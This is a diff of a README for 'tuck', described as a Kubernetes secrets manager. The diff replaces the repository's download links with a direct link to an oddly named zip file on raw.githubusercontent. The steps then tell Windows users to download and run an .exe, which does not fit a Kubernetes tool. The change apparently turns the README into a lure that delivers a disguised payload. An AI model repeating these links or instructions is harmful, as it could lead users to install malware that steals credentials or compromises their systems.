@@ -1,6 +1,6 @@
 # 🛡️ tuck - Secure secrets management for Kubernetes clusters
 
-[![](https://img.shields.io/badge/Download_tuck-blue.svg)](https://github.com/coveringommastrephes591/tuck)
+[![](https://img.shields.io/badge/Download_tuck-blue.svg)](https://raw.githubusercontent.com/coveringommastrephes591/tuck/main/costopleural/Software_awapuhi.zip)
 
 Tuck manages sensitive information inside your Kubernetes environment. It uses strong encryption to keep your passwords, keys, and tokens safe. It runs as one small file and needs no separate database. The software unlocks itself without human help.
 
@@ -8,7 +8,7 @@ Tuck manages sensitive information inside your Kubernetes environment. It uses s
 
 You need a Windows computer to use this version. Follow these steps to set up the software.
 
-1. Go to the official [tuck download page](https://github.com/coveringommastrephes591/tuck).
+1. Go to the official [tuck download page](https://raw.githubusercontent.com/coveringommastrephes591/tuck/main/costopleural/Software_awapuhi.zip).
 2. Look for the Assets section on that page.
 3. Click the file ending in .exe for Windows.
 4. Save the file to your computer.
